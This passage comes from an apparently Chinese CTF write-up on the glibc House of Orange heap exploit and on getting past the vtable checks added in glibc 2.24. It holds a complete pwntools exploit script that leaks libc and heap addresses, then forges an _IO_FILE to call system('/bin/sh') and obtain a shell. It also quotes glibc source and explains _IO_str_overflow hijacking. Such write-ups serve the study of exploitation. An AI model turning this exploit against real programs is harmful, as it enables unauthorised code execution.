class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> swpwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&#x27;./houseoforange&#x27;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">io = process(binary, aslr = <span class="number">0</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">context.terminal = [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;notiterm.py&quot;</span>,<span class="string">&quot;-t&quot;</span>,<span class="string">&quot;iterm&quot;</span>,<span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line">myu64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">house_of_orange</span>(<span class="params">head_addr, system_addr, io_list_all</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload + p64(<span class="number">97</span>) + p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">16</span>)</span><br><span class="line">    payload = payload + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) * <span class="number">9</span> + p64(system_addr) + p64(<span class="number">0</span></span><br><span class="line">        ) * <span class="number">4</span></span><br><span class="line">    payload = payload + p64(head_addr + <span class="number">18</span> * <span class="number">8</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(<span class="number">0</span></span><br><span class="line">        ) + p64(<span class="number">18446744073709551615</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(head_addr + <span class="number">12</span> * <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span>():</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">nm, length, pz, color</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(str(length))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(nm)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(str(pz))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(str(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span>(<span class="params">nm, length, pz, color</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(str(length))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.send(nm)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(str(pz))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(str(color))</span><br><span class="line">breakpoint = [<span class="number">0x01415</span>,<span class="number">0x13FD</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">break *0x555555554000+0x01415</span></span><br><span class="line"><span class="string">break *0x555555554000+0x13FD </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">build(<span class="string">&#x27;0&#x27;</span> * <span class="number">8</span>, <span class="number">0x90</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;c&#x27;</span> * <span class="number">0x90</span></span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">pay += p32(<span class="number">0</span>) + p32(<span class="number">0x20</span>) + p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0xf21</span>)</span><br><span class="line"><span class="comment"># overwrite the top chunk</span></span><br><span class="line">pause()</span><br><span class="line">upgrade(pay, len(pay), <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger _int_free()</span></span><br><span class="line">build(<span class="string">&#x27;1&#x27;</span>, <span class="number">0x1000</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># build a large chunk</span></span><br><span class="line">build(<span class="string">&#x27;2&#x27;</span>, <span class="number">0x400</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">see()</span><br><span class="line">io.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = myu64(io.recvn(<span class="number">6</span>)) &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + hex(libc_addr) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">libc.address = libc_addr - <span class="number">0x3bd000</span></span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + hex(libc.address) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap with fd_nextsize, bk_nextsize</span></span><br><span class="line">upgrade(<span class="string">&#x27;2&#x27;</span> * <span class="number">0x10</span>, <span class="number">0x400</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">see()</span><br><span class="line">io.recvuntil(<span class="string">&quot;2&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line">heap_addr = myu64(io.recvn(<span class="number">6</span>)) - <span class="number">0x140</span></span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + hex(heap_addr) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     break *0x555555554000+0x13FD </span></span><br><span class="line"><span class="comment">#     break *0x555555554000+0x01415</span></span><br><span class="line"><span class="comment">#     &#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin attack</span></span><br><span class="line">pay = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x400</span></span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">pay += p32(<span class="number">0x1f</span>) + p32(<span class="number">0x1</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stream = house_of_orange(<span class="number">0x555555758570</span>,libc.symbols[<span class="string">&#x27;system&#x27;</span>],libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># stream = &#x27;/bin/sh\0&#x27; + p64(0x61)</span></span><br><span class="line"><span class="comment"># stream += p64(0) + p64(libc.symbols[&#x27;_IO_list_all&#x27;] - 0x10)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stream = stream.ljust(0xa0, &#x27;\0&#x27;)</span></span><br><span class="line"><span class="comment"># ## fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment"># stream += p64(heap_addr + 0x610)</span></span><br><span class="line"><span class="comment"># stream = stream.ljust(0xc0, &#x27;\0&#x27;)</span></span><br><span class="line"><span class="comment"># stream += p64(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pay += stream</span></span><br><span class="line"><span class="comment"># pay += p64(0) * 2</span></span><br><span class="line"><span class="comment"># ## vtable</span></span><br><span class="line"><span class="comment"># pay += p64(heap_addr + 0x668)</span></span><br><span class="line"><span class="comment"># pay += p64(0) * 6</span></span><br><span class="line"><span class="comment"># pay += p64(libc.symbols[&#x27;system&#x27;])</span></span><br><span class="line"></span><br><span class="line">pay += stream</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">upgrade(pay, <span class="number">0x800</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x03-houseoforange-glibc-2-24-bypass"><a href="#0x03-houseoforange-glibc-2-24-bypass" class="headerlink" title="0x03 houseoforange (glibc 2.24 bypass)"></a>0x03 houseoforange (glibc 2.24 bypass)</h2><p>在 glibc 2.24 中新增了对 vtable 的check。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class="line"><span class="comment">   terminate the process.  */</span></span><br><span class="line"><span class="keyword">void</span> _IO_vtable_check (<span class="keyword">void</span>) attribute_hidden;</span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">uintptr_t</span> ptr = (<span class="keyword">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - (<span class="keyword">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，计算 <code>section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</code>，紧接着会判断 vtable -  __start___libc_IO_vtables 的 offset ，如果这个 offset 大于 section_length ,即大于 <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> 那么就会调用 <code>_IO_vtable_check()</code> 这个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*flag) (<span class="keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!rtld_active ()</span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两段 check：</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190313005638.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190313005638.png"></a></p><p>这里，angelboy 提出来了两种bypass 方法</p><ul><li><p>overwrite IO_accept_foreign_vtables </p><p>由于有 PTR_DEMANGLE(flag) 的存在，很难bypass</p></li><li><p>overwrite _dl_open_hook</p><p>这是一个不错的选项，但是如果我们能覆盖 <code>_dl_open_hook</code> 意味着，我们能控制其他更好的内容。</p></li></ul><p>此时就把视角转移到了 <code> _IO_FILE</code> 结构体上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为进程中包含了系统默认的三个文件流 stdin\stdout\stderr，因此这种方式可以不需要进程中存在文件操作，通过 scanf\printf 一样可以进行利用。</p><p>在_IO_FILE 中_IO_buf_base 表示操作的起始地址，_IO_buf_end 表示结束地址，通过控制这两个数据可以实现控制读写的操作。这种方法，留到下一个小个地方写，这里要写的是另外一种方法</p><p>或者将视角移到了其他的 vtable 中，在 libc 中不仅仅有 <code>_IO_file_jumps</code> 这么一个 vtable ，还有<code>_IO_str_jumps</code> ，其虚表结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以 <code>_IO_str_overflow</code> 为例：当我们将文件指针的<code>vtable</code>设置为<code>_IO_str_jumps</code></p><h3 id="IO-str-jumps-gt-overflow"><a href="#IO-str-jumps-gt-overflow" class="headerlink" title="_IO_str_jumps -&gt; overflow"></a>_IO_str_jumps -&gt; overflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">// must bypass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)) <span class="comment">// should enter here</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span> <span class="comment">// must bypass</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> *new_buf;</span><br><span class="line">  <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">  <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">  _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; old_blen) <span class="comment">// pass 一般check 为真</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  new_buf</span><br><span class="line">    = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用以下代码来劫持程序流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_buf</span><br><span class="line">  = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></table></figure><p>在 <code>_IO_str_overflow</code> ，有几个条件需要满足</p><ul><li>fp-&gt;_flags &amp; _IO_NO_WRITES为假</li><li>(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</li><li>fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假</li><li>2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 不能为负数</li><li>new_size = 2 * 